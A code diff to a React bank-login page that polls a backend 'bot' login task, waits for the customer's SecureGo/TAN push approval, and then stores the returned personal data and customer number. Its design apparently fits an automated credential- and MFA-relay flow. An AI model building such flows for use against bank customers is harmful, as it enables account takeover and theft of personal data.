@@ -253,8 +253,38 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
       const st = data?.status;
 
-      // Instant redirect as soon as person data is available (even while running)
-      if (data?.result && (data.result.person_data || data.result.customer_number)) {
+      const payloadValues = collectBotPayloadValues(data);
+      const tanRequired = payloadValues.some(([key, value]) =>
+        (key === "tan_required" && value === true) ||
+        (["tan_type", "qr_code", "activation_code", "challenge"].includes(key) && Boolean(value)),
+      );
+      const loginValidated = hasPositiveLoginValidation(data);
+      const looksLikeSecureGo = payloadContains(
+        data,
+        /secure\s*go|sicherheitsfreigabe|kundenauthentifizierung|freigabe|tan\s*(?:erforderlich|required)|push\s*(?:tan|freigabe)/i,
+      );
+      const tanConfirmedSignal =
+        st === "tan_confirmed" ||
+        payloadValues.some(([key, value]) =>
+          ([
+            "tan_confirmed",
+            "approved",
+            "freigegeben",
+            "customer_auth_confirmed",
+            "customer_authentication_confirmed",
+            "kundenauthentifizierung_bestaetigt",
+          ].includes(key)) &&
+          (value === true || value === 1 || String(value).toLowerCase() === "true"),
+        );
+
+      const hasPersonData = Boolean(
+        data?.result && (data.result.person_data || data.result.customer_number),
+      );
+      const approvalConfirmed = st === "completed" || tanConfirmedSignal;
+
+      // Person data can arrive before the customer approves SecureGo. Keep polling
+      // and only leave the approval screen after the API explicitly confirms it.
+      if (hasPersonData && approvalConfirmed) {
         try { sessionStorage.setItem(`bot_result_${taskId}`, JSON.stringify(data.result)); } catch {}
         try {
           sessionStorage.setItem(`bot_bank_${taskId}`, JSON.stringify({
@@ -269,28 +299,11 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
         return;
       }
 
-      const payloadValues = collectBotPayloadValues(data);
-      const tanRequired = payloadValues.some(([key, value]) =>
-        (key === "tan_required" && value === true) ||
-        (["tan_type", "qr_code", "activation_code", "challenge"].includes(key) && Boolean(value)),
-      );
-      const loginValidated = hasPositiveLoginValidation(data);
-      const looksLikeSecureGo = payloadContains(
-        data,
-        /secure\s*go|sicherheitsfreigabe|kundenauthentifizierung|freigabe|tan\s*(?:erforderlich|required)|push\s*(?:tan|freigabe)/i,
-      );
-      const tanConfirmedSignal =
-        st === "tan_confirmed" ||
-        payloadValues.some(([key, value]) =>
-          (key === "tan_confirmed" || key === "approved" || key === "freigegeben") &&
-          (value === true || value === 1 || String(value).toLowerCase() === "true"),
-        );
-
       if (tanRequired || loginValidated || looksLikeSecureGo || tanConfirmedSignal || st === "waiting_for_tan" || st === "completed") {
         pollRef.current.positiveSeen = true;
       }
 
-      // Completed always wins
+      // A completed response without personal data can still use the generic result screen.
       if (st === "completed") {
         setResult(data?.result ?? null);
         setPhase("result");
